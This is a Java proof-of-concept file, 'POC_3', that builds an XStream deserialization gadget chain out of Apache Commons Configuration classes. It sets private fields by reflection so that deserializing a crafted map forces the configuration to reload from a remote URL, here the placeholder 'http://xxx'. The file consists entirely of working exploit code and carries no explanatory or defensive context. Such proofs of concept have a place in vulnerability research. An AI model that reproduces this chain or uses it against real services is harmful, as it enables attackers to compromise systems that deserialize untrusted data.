package com.example.CC;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.XStreamUtil;
import org.apache.commons.configuration.INIConfiguration;
import org.apache.commons.configuration.Lock;
import org.apache.commons.configuration.reloading.FileChangedReloadingStrategy;
import org.apache.commons.logging.impl.NoOpLog;

import java.net.URL;
import java.util.Map;

public class POC_3 {

    public static void main(String[] args) throws Exception {
        INIConfiguration fc = new INIConfiguration();
        FileChangedReloadingStrategy strategy = new FileChangedReloadingStrategy();
        ReflectionUtil.setField(strategy, "reloading", true);

        ReflectionUtil.setField(fc, "strategy", strategy);
        ReflectionUtil.setField(fc, "log", new NoOpLog());
        URL url = new URL("http://xxx");
        ReflectionUtil.setField(fc, "sourceURL", url);
        ReflectionUtil.setField(fc, "reloadLock", new Lock("AbstractFileConfiguration"));
        ReflectionUtil.setField(fc, "lockDetailEventsCount", new Object());
        ReflectionUtil.setField(fc, "detailEvents", -1);

        Object configuration1 = ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.configuration.ConfigurationMap$ConfigurationSet"));
        ReflectionUtil.setField(configuration1, "configuration", fc);

        Map has = ReflectionUtil.makeMap(configuration1);
        XStreamUtil.deserialize(XStreamUtil.serialize(has));
    }

}